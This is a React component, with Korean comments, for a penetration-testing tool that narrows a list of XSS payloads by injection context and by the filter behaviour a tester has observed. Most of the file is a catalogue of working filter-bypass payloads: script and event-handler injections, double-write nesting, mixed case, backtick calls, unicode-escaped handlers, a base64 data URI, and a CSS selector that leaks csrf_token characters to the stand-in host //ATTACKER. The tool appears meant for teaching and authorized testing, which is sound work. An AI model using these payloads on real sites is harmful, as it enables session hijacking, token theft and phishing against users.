import { useMemo, useState } from 'react'
import { DISCLAIMER, NoteWithCopy, Note, Pick, Readout } from './shared'
import xssScoutScript from './xssScoutScript.txt?raw'

/* ── XSS 소거법 워크벤치 ──────────────────────────────────────────
 * 기존 "컨텍스트→벡터→실행코드→우회→인코딩" 4단계 조합 빌더는 필터
 * 우회 지식이 있는 사람에게는 빠르지만, 지식이 없는 사람에게는 "뭘 먼저
 * 걸러야 하는지"에 대한 안내가 없었다. 이 버전은 반대로 간다:
 *
 *   1) 컨텍스트를 고르면 그 컨텍스트에서 "말이 되는" 페이로드 전체가 먼저
 *      다 보인다 (초기 상태 = 전체 목록).
 *   2) "실제로 관찰한 필터 동작"을 체크해나가면, 그 필터에 걸리는
 *      페이로드만 결과에서 사라진다 — 즉 소거법.
 *   3) 체크박스로 못 잡는 특이 필터(예: 정확히 "<script>" 전체 문자열만
 *      막고 "<" 단독은 안 막는 compound 필터)는 차단 키워드 텍스트박스로
 *      직접 입력해서 추가로 소거한다.
 *   4) 남은 페이로드마다 "왜 통하는지" 원리를 짧게 적어 학습이 되게 한다.
 *
 * 각 체크박스는 "이 필터가 걸러낼 만한 페이로드"를 자동으로 트리거
 * 정규식으로 판별한다 — 단, 페이로드가 바로 그 필터를 우회하도록
 * 설계된 경우엔 immuneAlways/immuneIf 로 예외를 선언해 살려둔다.
 * single-pass 같은 "완전 탐지 vs 1회성 탐지" 체크박스는 그 자체로는
 * 아무것도 지우지 않고, 중첩/이중 삽입류 페이로드의 immuneIf 조건으로만
 * 쓰인다(필터가 비재귀적이라는 "약점"이 있어야 그 기법이 의미 있기
 * 때문).
 */

type Filter = {
  id: string
  category: string
  label: string
  hint?: string
}

type Payload = {
  id: string
  label: string
  text: string
  principle: string
  /** 이 필터는 트리거 정규식상 걸리더라도 이 페이로드는 원래부터 안전하다 */
  immuneAlways?: string[]
  /** requires 에 적힌 필터가 전부 체크되어 있을 때만 filterId 에 면제된다
   *  (예: "비재귀 검사" 약점이 있어야만 중첩삽입이 의미 있는 경우) */
  immuneIf?: { filterId: string; requires: string[] }[]
}

type Ctx = {
  id: string
  label: string
  hint: string
  payloads: Payload[]
}

/* ── 1. 필터 체크리스트 ────────────────────────────────────────── */

const FILTER_CATEGORIES = [
  { id: 'angle', label: '꺾쇠(<, >) 처리' },
  { id: 'keyword', label: '키워드 블랙리스트' },
  { id: 'punct', label: '구두점 / 구조 문자' },
  { id: 'special', label: '검사 방식 · 정책 (고급)' },
] as const

const FILTERS: Filter[] = [
  { id: 'lt-entity', category: 'angle', label: '`<` 가 HTML 엔티티(`&lt;`)로 자동 인코딩됨' },
  { id: 'lt-strip', category: 'angle', label: '`<` 문자가 통째로 제거됨 (strip)' },
  { id: 'gt-strip', category: 'angle', label: '`>` 만 제거/인코딩되고 `<` 는 그대로 통과함', hint: '여는 꺾쇠는 살아있고 닫는 꺾쇠만 막히는, 의외로 자주 보는 비대칭 필터' },

  { id: 'script-ci', category: 'keyword', label: '`script` 문자열이 대소문자 구분 없이 제거/차단됨' },
  { id: 'script-cs', category: 'keyword', label: '`script` 문자열이 정확히 소문자일 때만 제거됨', hint: '대소문자 구분(case-sensitive) 필터 — 혼용 표기로 우회 가능' },
  { id: 'javascript-ci', category: 'keyword', label: '`javascript:` 문자열이 대소문자 구분 없이 차단됨' },
  { id: 'javascript-cs', category: 'keyword', label: '`javascript:` 문자열이 정확히 소문자일 때만 차단됨' },
  { id: 'on-attr-ci', category: 'keyword', label: '`on*` 이벤트 핸들러 속성이 대소문자 구분 없이 차단됨' },
  { id: 'on-attr-cs', category: 'keyword', label: '`on*` 이벤트 핸들러 속성이 정확히 소문자일 때만 차단됨' },
  { id: 'func-blacklist', category: 'keyword', label: '`alert`/`eval`/`prompt`/`confirm` 등 실행 함수명이 블랙리스트로 차단됨' },
  { id: 'global-blacklist', category: 'keyword', label: '`document`/`window` 같은 전역 객체 이름이 차단됨' },

  { id: 'quote-strip', category: 'punct', label: '따옴표(`"` / `\'`)가 이스케이프되거나 제거됨' },
  { id: 'paren-strip', category: 'punct', label: '괄호 `(` `)` 가 제거/차단됨' },
  { id: 'space-collapse', category: 'punct', label: '공백 문자가 제거되거나 1개로 축약됨', hint: '태그명과 속성 사이 스페이스(0x20)만 막는 필터 — 탭/개행/슬래시로 대체 가능' },
  { id: 'backtick-strip', category: 'punct', label: '백틱(`` ` ``)이 제거됨' },
  { id: 'semicolon-strip', category: 'punct', label: '세미콜론(`;`)이 제거됨' },

  { id: 'single-pass', category: 'special', label: '필터가 입력을 1회만 검사한다 (치환 후 재검사 안 함)', hint: '지우는 필터 자체가 아니라 "약점" 체크박스 — 이걸 켜면 중첩/이중 삽입(double-write)류 기법이 추가로 노출됨' },
  { id: 'csp-inline', category: 'special', label: 'CSP가 인라인 `<script>`/이벤트 핸들러 실행을 차단함 (nonce/hash 없는 inline 전부 차단)' },
  { id: 'src-whitelist', category: 'special', label: '`src`/`href` 값이 프로토콜·도메인 화이트리스트 검사를 받음' },
]

/** filterId → 이 텍스트가 "naive"한 필터라면 걸러질지 여부. single-pass 처럼
 *  트리거가 없는(=절대 직접 제외하지 않는) 항목은 여기 없다. */
const TRIGGERS: Record<string, (text: string) => boolean> = {
  'lt-entity': t => t.includes('<'),
  'lt-strip': t => t.includes('<'),
  'gt-strip': t => t.includes('>'),
  'script-ci': t => /script/i.test(t),
  'script-cs': t => t.includes('script'),
  'javascript-ci': t => /javascript\s*:/i.test(t),
  'javascript-cs': t => t.includes('javascript:'),
  'on-attr-ci': t => /\bon[a-z]+\s*=/i.test(t),
  'on-attr-cs': t => /\bon[a-z]+\s*=/.test(t),
  'func-blacklist': t => /\b(alert|eval|prompt|confirm)\b/i.test(t),
  'global-blacklist': t => /\b(document|window)\b/i.test(t),
  'quote-strip': t => /["']/.test(t),
  'paren-strip': t => /[()]/.test(t),
  'space-collapse': t => /<[a-zA-Z][a-zA-Z0-9]*\x20[a-zA-Z]/.test(t),
  'backtick-strip': t => t.includes('`'),
  'semicolon-strip': t => t.includes(';'),
  'csp-inline': t => /<script[\s>]|on[a-z]+\s*=|javascript\s*:/i.test(t),
  'src-whitelist': t => /^javascript:/i.test(t) || /^data:/i.test(t) || /^\/\//.test(t) || /(src|href)\s*=\s*["']?\s*(javascript:|data:)/i.test(t),
}

function isBlocked(p: Payload, filterId: string, checked: Set<string>): boolean {
  const trigger = TRIGGERS[filterId]
  if (!trigger || !trigger(p.text)) return false
  if (p.immuneAlways?.includes(filterId)) return false
  const cond = p.immuneIf?.find(c => c.filterId === filterId)
  if (cond && cond.requires.every(r => checked.has(r))) return false
  return true
}

/* ── 2. 컨텍스트별 페이로드 목록 ──────────────────────────────────
 * 플레이스홀더: alert(document.domain) — 반사/실행 오리진 확인용.
 * //ATTACKER — 진단자가 관리하는 수집 서버로 바꿔서 쓸 것(DISCLAIMER 참고). */

const CONTEXTS: Ctx[] = [
  {
    id: 'html-text',
    label: 'HTML 본문 (텍스트 노드)',
    hint: '반사 값이 태그 사이의 순수 텍스트로 들어갈 때. <div>여기</div> 의 "여기" 자리.',
    payloads: [
      { id: 'basic-script', label: 'script 태그 직접 삽입', text: '<script>alert(document.domain)</script>',
        principle: '가장 기본적인 삽입 — 별도 우회 기법 없이, 필터가 전혀 없을 때만 통과하는 베이스라인.' },
      { id: 'img-onerror', label: 'img onerror', text: '<img src=x onerror=alert(document.domain)>',
        principle: '"script"·"javascript:" 문자열을 전혀 쓰지 않는 벡터 — 키워드 블랙리스트는 우회하지만 `<`, on* 핸들러, 괄호 필터에는 그대로 걸린다.' },
      { id: 'svg-onload', label: 'svg onload', text: '<svg onload=alert(document.domain)>',
        principle: 'img와 동일한 원리의 또 다른 벡터 — 특정 태그명만 블랙리스트에 있는 경우를 대비한 대안.' },
      { id: 'svg-onload-slash', label: 'svg onload (공백 대신 /)', text: '<svg/onload=alert(document.domain)>',
        principle: '태그명과 속성 사이 공백을 `/` 로 대체 — HTML 파서는 `/` 를 공백과 동등하게 취급하므로 "공백 1개만 제거/축약" 하는 필터를 우회.' },
      { id: 'svg-onload-newline', label: 'svg onload (공백 대신 개행)', text: '<svg\nonload=alert(document.domain)>',
        principle: '스페이스(0x20) 문자 자체를 찾는 필터는 통과시키지만, 탭/개행 등 다른 공백류 문자는 여전히 HTML 파서가 구분자로 인식.' },
      { id: 'svg-onload-mixedcase', label: 'svg OnLoAd (대소문자 혼용)', text: '<svg OnLoAd=alert(document.domain)>',
        principle: 'HTML 속성명은 대소문자를 구분하지 않아 브라우저는 그대로 인식 — "on" 으로 시작하는 패턴을 정확한 소문자로만 찾는 case-sensitive 필터를 우회.' },
      { id: 'svg-onload-backtick', label: 'svg onload (괄호 없이 백틱 호출)', text: '<svg onload=alert`1`>',
        principle: '태그드 템플릿 호출(`` alert`1` ``)로 괄호 없이 함수 실행 — 단 인자 1개짜리 함수에만 쓸 수 있고, 백틱도 같이 막히면 무력화됨.' },
      { id: 'img-onerror-print', label: 'img onerror + print()', text: '<img src=x onerror=print()>',
        principle: 'alert/eval/prompt/confirm 위주로 짜인 흔한 함수명 블랙리스트에 `print()` 는 자주 빠져있다 — 팝업으로 반사/실행 여부만 확인할 때 유용.' },
      { id: 'script-doublewrite', label: 'script 중첩 이중 삽입 (double-write)', text: '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
        principle: '필터가 "script" 를 한 번만, 재귀적으로 재검사하지 않고 지우면 — 지워진 자리에 글자가 다시 맞춰져 `<script>` 가 재구성된다. "1회만 검사" 약점이 있어야만 통한다.',
        immuneIf: [{ filterId: 'script-ci', requires: ['single-pass'] }, { filterId: 'script-cs', requires: ['single-pass'] }] },
      { id: 'a-href-js', label: 'a href javascript: (이벤트 핸들러 없음)', text: '<a href="javascript:alert(document.domain)">클릭 유도</a>',
        principle: 'on* 이벤트 핸들러를 전혀 안 써서 그 필터는 우회하지만, javascript: 스킴·따옴표 필터에는 걸리고 사용자 클릭이 필요하다는 제약이 있다.' },
    ],
  },
  {
    id: 'attr-dq',
    label: 'HTML 속성값 (큰따옴표로 감싸짐)',
    hint: '<input value="HERE"> 처럼 큰따옴표 안에 반사될 때.',
    payloads: [
      { id: 'breakout-img', label: '" 로 닫고 새 태그 (img)', text: '"><img src=x onerror=alert(document.domain)>',
        principle: '큰따옴표를 닫고(`"`) 태그를 닫은(`>`) 뒤 새 태그를 주입 — 가장 기본적인 속성 이탈.' },
      { id: 'breakout-svg', label: '" 로 닫고 새 태그 (svg)', text: '"><svg onload=alert(document.domain)>',
        principle: 'img와 같은 원리의 대안 벡터.' },
      { id: 'same-tag-attr', label: '같은 태그에 속성만 추가 (탈출 없음)', text: '" autofocus onfocus=alert(document.domain) x="',
        principle: '태그를 닫지 않고 같은 태그 안에 새 속성(autofocus+onfocus)만 추가 — `<`/`>` 가 전혀 필요 없어서 꺾쇠 필터는 아예 무의미해진다. 필요한 건 여는/닫는 따옴표뿐.' },
      { id: 'same-tag-attr-mixedcase', label: '같은 태그 + 대소문자 혼용 핸들러', text: '" OnFocUs=alert(document.domain) autofocus x="',
        principle: '위 기법에 대소문자 혼용을 더해 "on 으로 시작하는 소문자 패턴"만 찾는 필터까지 같이 우회.' },
      { id: 'same-tag-attr-backtick', label: '같은 태그 + 괄호 없이 백틱 호출', text: '" autofocus onfocus=alert`1` x="',
        principle: '꺾쇠·괄호 둘 다 필요 없는 조합 — 남는 건 따옴표와 백틱뿐이라, 이 둘만 막혀도 완전히 죽는다는 걸 역으로 보여주는 예시.' },
    ],
  },
  {
    id: 'attr-sq',
    label: 'HTML 속성값 (작은따옴표로 감싸짐)',
    hint: "<input value='HERE'> 처럼 작은따옴표 안에 반사될 때.",
    payloads: [
      { id: 'breakout-img', label: "' 로 닫고 새 태그 (img)", text: "'><img src=x onerror=alert(document.domain)>",
        principle: '작은따옴표를 닫고(`\'`) 태그를 닫은(`>`) 뒤 새 태그를 주입.' },
      { id: 'breakout-svg', label: "' 로 닫고 새 태그 (svg)", text: "'><svg onload=alert(document.domain)>",
        principle: 'img와 같은 원리의 대안 벡터.' },
      { id: 'same-tag-attr', label: '같은 태그에 속성만 추가 (탈출 없음)', text: "' autofocus onfocus=alert(document.domain) x='",
        principle: '태그를 닫지 않고 속성만 추가 — `<`/`>` 불필요, 필요한 건 여는/닫는 작은따옴표뿐.' },
      { id: 'same-tag-attr-mixedcase', label: '같은 태그 + 대소문자 혼용 핸들러', text: "' OnFocUs=alert(document.domain) autofocus x='",
        principle: '대소문자 혼용으로 소문자 전용 on* 필터까지 우회.' },
    ],
  },
  {
    id: 'attr-unquoted',
    label: 'HTML 속성값 (따옴표 없음)',
    hint: '<input value=HERE> 처럼 아예 따옴표 없이 반사될 때.',
    payloads: [
      { id: 'space-newattr', label: '공백으로 새 속성 주입', text: ' onerror=alert(document.domain) autofocus x=',
        principle: '애초에 따옴표가 없는 컨텍스트라 탈출에 `"`/`\'` 자체가 필요 없음 — 공백 하나만으로 같은 태그에 새 속성을 추가한다. 따옴표 필터는 여기선 처음부터 무의미.' },
      { id: 'slash-newattr', label: '/ 로 새 속성 주입 (공백 대체)', text: '/onerror=alert(document.domain)/autofocus/',
        principle: '구분자로 공백 대신 `/` 사용 — 공백(0x20) 문자만 찾아 제거/축약하는 필터를 우회.' },
      { id: 'mixedcase-newattr', label: '대소문자 혼용 핸들러', text: ' OnErRor=alert(document.domain) autofocus x=',
        principle: '소문자 on* 패턴만 찾는 case-sensitive 필터 우회.' },
      { id: 'backtick-newattr', label: '괄호 없이 백틱 호출', text: ' onerror=alert`1` autofocus x=',
        principle: '꺾쇠·따옴표 둘 다 불필요한 컨텍스트에서 괄호까지 제거한 조합.' },
    ],
  },
  {
    id: 'js-string',
    label: '<script> 내부 JS 문자열 리터럴',
    hint: 'var x = "HERE"; 처럼 이미 <script> 블록 안, 문자열 리터럴 안에 반사될 때.',
    payloads: [
      { id: 'dq-breakout', label: '" 닫고 statement 주입', text: '";alert(document.domain);//',
        principle: '큰따옴표로 문자열을 닫고 세미콜론으로 문장을 끝낸 뒤 새 statement 주입, `//` 로 뒤에 남는 원본 코드를 주석 처리.' },
      { id: 'sq-breakout', label: "' 닫고 statement 주입", text: "';alert(document.domain);//",
        principle: '작은따옴표 버전 — 반사되는 리터럴이 어느 따옴표를 쓰는지에 맞춰 선택.' },
      { id: 'concat-breakout', label: '세미콜론 없이 문자열 연결로 주입', text: '"+alert(document.domain)+"',
        principle: '세미콜론 대신 `+` 연산자로 표현식 중간에 함수 호출을 끼워 넣는다 — alert()의 반환값(undefined)과 문자열을 이어붙이는 과정에서 호출은 그대로 실행된다. 세미콜론 제거 필터 우회.' },
      { id: 'backtick-breakout', label: '괄호 없이 백틱 호출', text: '";alert`1`;//',
        principle: '문자열 탈출은 그대로 하되 실행부만 괄호 없는 백틱 호출로 교체.' },
    ],
  },
  {
    id: 'js-template',
    label: 'JS 템플릿 리터럴 (백틱 `...` 안)',
    hint: '`HERE` 처럼 백틱으로 감싸인 템플릿 리터럴 안에 반사될 때.',
    payloads: [
      { id: 'substitution', label: '${} 치환식으로 즉시 실행', text: '${alert(document.domain)}',
        principle: '템플릿 리터럴의 치환식(`${}`)은 꺾쇠·따옴표·백틱 탈출 없이 그 자체로 JS 표현식으로 평가된다 — HTML 관련 필터 전부와 무관하게, 이 컨텍스트 자체가 사실상 직통 실행 경로.' },
      { id: 'substitution-backtick', label: '${} 안에서 괄호 없이 백틱 호출', text: '${alert`1`}',
        principle: '치환식 안의 함수 호출까지 괄호 없는 형태로 — 단 이 경우 백틱 자체가 필요해서 backtick-strip 필터에는 걸린다.' },
      { id: 'full-breakout', label: '백틱을 닫고 완전히 탈출', text: '`;alert(document.domain);//',
        principle: '치환식이 아니라 리터럴 자체를 닫는(백틱) 방식 — js-string 탈출과 동일한 원리이지만 닫는 문자가 백틱이라, 백틱이 막히면 역시 탈출 불가.' },
    ],
  },
  {
    id: 'url-attr',
    label: 'URL 속성 (href / src 값 자체)',
    hint: '<a href="HERE">, <iframe src="HERE"> 처럼 반사되는 값이 애초에 URL 속성 전체일 때 — 탈출 문자 없이 스킴만 바꾸면 끝나는 경우가 많다.',
    payloads: [
      { id: 'js-scheme', label: 'javascript: 스킴', text: 'javascript:alert(document.domain)',
        principle: '속성 자체가 href/src 라면 탈출 문자가 전혀 필요 없다 — `<`, `>`, 따옴표 모두 불필요, 스킴만 javascript: 로. 단 <a>는 클릭이 필요하고 최신 브라우저는 img/iframe의 src에서 javascript:를 실행하지 않는다.' },
      { id: 'js-scheme-mixedcase', label: 'javascript: 스킴 (대소문자 혼용)', text: 'JaVaScRiPt:alert(document.domain)',
        principle: 'URL 스킴은 대소문자를 구분하지 않아 브라우저는 그대로 인식 — 정확히 소문자 "javascript:" 만 찾는 필터를 우회.' },
      { id: 'data-uri', label: 'data: URI (HTML 삽입)', text: 'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+',
        principle: 'javascript: 스킴 전용 필터는 피하지만, iframe src 등에서만 의미가 있고 결과 realm이 opaque origin이라 쿠키/동일 출처 DOM에는 접근 못 한다(디페이스·피싱용). base64 부분은 "<script>alert(document.domain)</script>".' },
      { id: 'protocol-relative', label: '프로토콜 상대 경로로 원격 이전', text: '//ATTACKER/phish',
        principle: '스킴 없이 `//` 만으로 외부 호스트로 이동 — javascript:/data: 전용 필터를 우회하지만 도메인 화이트리스트 검사에는 걸린다.' },
    ],
  },
  {
    id: 'css',
    label: 'CSS (style 속성 / <style> 블록)',
    hint: 'style="HERE" 속성 안, 또는 <style>HERE</style> 블록 안에 반사될 때. 최신 브라우저에서 CSS만으로 JS를 직접 실행하는 경로는 거의 죽었다는 점을 먼저 알아둘 것.',
    payloads: [
      { id: 'style-block-breakout', label: '</style> 로 탈출 후 태그 삽입', text: '</style><img src=x onerror=alert(document.domain)>',
        principle: '`</style>` 로 CSS 파싱 컨텍스트를 탈출해 일반 HTML 태그를 삽입 — 결국 HTML 컨텍스트 이탈 문제로 귀결된다.' },
      { id: 'style-attr-breakout', label: '속성 탈출 후 태그 삽입', text: '"><img src=x onerror=alert(document.domain)>',
        principle: 'style 속성도 결국 HTML 속성이라 attr-dq 와 동일한 탈출 방식이 그대로 적용된다.' },
      { id: 'css-exfil-selector', label: 'CSS 속성 선택자 기반 데이터 유출 (JS 실행 없음)', text: '<style>input[name=csrf_token][value^="a"]{background:url(//ATTACKER/leak?c=a)}</style>',
        principle: 'JS 실행이 전혀 아니다 — 속성 선택자가 매치될 때만 background url() 요청이 발생하는 걸 이용해 글자 단위로 값을 blind exfiltration. on*/script/javascript: 키워드 필터와 완전히 무관.' },
      { id: 'css-expression-legacy', label: 'CSS expression() (IE 레거시, 참고용)', text: 'width:expression(alert(document.domain))',
        principle: '⚠ IE7 이하에서만 동작했던 레거시 기법 — 현재 사용 중인 브라우저에서는 사실상 동작하지 않는다. 오래된 사내 레거시 시스템 진단 시 참고만.' },
    ],
  },
  {
    id: 'json-html',
    label: 'JSON-in-HTML (JS로 평가/삽입되는 JSON 값)',
    hint: 'var data = {"key":"HERE"}; 처럼 <script> 안 JS 리터럴 값으로 반사되거나, 그 값이 이후 document.write/innerHTML 같은 sink로 흘러들어갈 때.',
    payloads: [
      { id: 'script-close', label: '</script> 로 블록 조기 종료', text: '</script><script>alert(document.domain)</script>',
        principle: 'JSON 이 <script> 블록 안에 있을 때 `</script>` 로 그 블록을 조기 종료하고 새 script를 바로 삽입 — JSON.parse 가 아니라 응답 전체가 HTML에 직접 꽂히는 구현에서 발생.' },
      { id: 'arith-breakout', label: '산술 연산자로 세미콜론 없이 주입', text: '"-alert(document.domain)-"',
        principle: '세미콜론·콤마 없이 `-` 연산자로 표현식 안에 함수 호출을 끼워 넣어, 가치가 NaN이 되더라도 뒤에 남는 JS 구조는 깨지 않는다 — 값이 JSON.parse 가 아니라 <script> 안 JS 리터럴로 직접 실행되는 구현에서 통한다.' },
      { id: 'unicode-escape-onerror', label: '유니코드 이스케이프로 "onerror" 자체를 안 씀', text: '<img src=x \\u006F\\u006E\\u0065\\u0072\\u0072\\u006F\\u0072=alert(document.domain)>',
        principle: '이 값이 JS 문자열 리터럴 소스 안에 있을 때, `\\u006F...` 는 JS 파서가 파싱 시점에 "onerror" 로 미리 디코딩한다. 네트워크로 전달되는 원문 바이트에는 "onerror" 라는 문자열 자체가 없어서 텍스트 기반 키워드 스캔을 통과하고, 런타임에는 정상적인 onerror 속성이 된다. document.write/eval류 sink 필요 — innerHTML 은 onerror 같은 속성은 그대로 동작하지만 <script> 태그 자체는 실행되지 않는다는 점은 유의.',
        immuneAlways: ['on-attr-ci', 'on-attr-cs'] },
      { id: 'plain-innerhtml', label: '가장 단순한 형태 (sink가 바로 innerHTML/document.write)', text: '<img src=x onerror=alert(document.domain)>',
        principle: 'JSON 값이 그대로 innerHTML/document.write 로 들어가는 가장 단순한 경우 — 별도 JSON 구조 우회 없이 HTML 인젝션 문제로 바로 환원된다.' },
    ],
  },
]

/* ── 3. 컴포넌트 ─────────────────────────────────────────────────── */

export function XssPayloadBuilder() {
  const [ctxId, setCtxId] = useState(CONTEXTS[0].id)
  const [checks, setChecks] = useState<Record<string, boolean>>({})
  const [blockText, setBlockText] = useState('')

  const ctx = CONTEXTS.find(c => c.id === ctxId)!
  const checkedSet = useMemo(() => new Set(Object.entries(checks).filter(([, v]) => v).map(([k]) => k)), [checks])
  const keywords = useMemo(() => blockText.split('\n').map(s => s.trim()).filter(Boolean), [blockText])

  const toggle = (id: string) => setChecks(c => ({ ...c, [id]: !c[id] }))
  const clearAll = () => { setChecks({}); setBlockText('') }

  const results = ctx.payloads.filter(p => {
    for (const f of FILTERS) {
      if (checkedSet.has(f.id) && isBlocked(p, f.id, checkedSet)) return false
    }
    const lower = p.text.toLowerCase()
    if (keywords.some(k => lower.includes(k.toLowerCase()))) return false
    return true
  })

  const checkedCount = checkedSet.size
  const excludedCount = ctx.payloads.length - results.length

  return <div className="payload-builder xss-guide">
    <NoteWithCopy copyText={xssScoutScript} copyLabel="스카우트 스크립트 복사">{DISCLAIMER}</NoteWithCopy>

    <Pick label="1. 삽입 위치 (컨텍스트)" value={ctxId} onChange={setCtxId}
      options={CONTEXTS.map(c => ({ id: c.id, label: c.label }))}/>
    <p className="payload-builder-hint">{ctx.hint}</p>

    <div className="xss-guide-filters-head">
      <label className="payload-builder-label" style={{ margin: 0 }}>2. 관찰된 필터 동작 (체크할수록 결과가 좁혀집니다)</label>
      {(checkedCount > 0 || keywords.length > 0) && <button className="xss-guide-clear" onClick={clearAll}>전체 해제</button>}
    </div>
    {FILTER_CATEGORIES.map(cat => <div className="xss-guide-group" key={cat.id}>
      <p className="xss-guide-group-title">{cat.label}</p>
      {FILTERS.filter(f => f.category === cat.id).map(f => <label className="cheatsheet-option" key={f.id}>
        <input type="checkbox" checked={!!checks[f.id]} onChange={() => toggle(f.id)}/>
        <span className="cheatsheet-option-body">
          <span className="cheatsheet-option-head"><b>{f.label}</b></span>
          {f.hint && <small>{f.hint}</small>}
        </span>
      </label>)}
    </div>)}

    <label className="payload-builder-label" htmlFor="xss-guide-blocklist">3. 체크박스로 못 잡는 차단 키워드 (한 줄에 하나씩)</label>
    <textarea id="xss-guide-blocklist" className="payload-builder-textarea" rows={3} value={blockText}
      onChange={e => setBlockText(e.target.value)}
      placeholder={'예: <script> (전체 문자열만 막히고 < 단독은 안 막히는 compound 필터)\nalert('}/>
    <p className="payload-builder-hint">입력한 각 줄을 대소문자 구분 없이 포함하는 페이로드는 결과에서 제외되고, 그 줄을 쓰지 않는 다른 기법으로 자동 대체됩니다.</p>

    <div className="xss-guide-results">
      <p className="payload-builder-label" style={{ margin: '14px 0 6px' }}>
        결과 — 전체 {ctx.payloads.length}개 중 {results.length}개 통과
        {(checkedCount > 0 || keywords.length > 0) && <> (필터 {checkedCount}개 · 차단 키워드 {keywords.length}개로 {excludedCount}개 제외)</>}
      </p>
      {results.length === 0 ? <Note>
        남은 페이로드가 없습니다. 이 조합에서는 참고 목록에 있는 클라이언트 측 우회가 없다는 뜻일 수 있습니다 — 체크를 하나씩 해제하며 정확히 어떤 조건이 막는지 역추적하거나, 다른 삽입 지점(속성/URL/JS 등 다른 컨텍스트)을 확인해보세요.
      </Note> : results.map(p => <div className="xss-guide-result" key={p.id}>
        <Readout title={p.label} value={p.text} wrap="anywhere"/>
        <p className="payload-builder-hint">{p.principle}</p>
      </div>)}
    </div>
  </div>
}
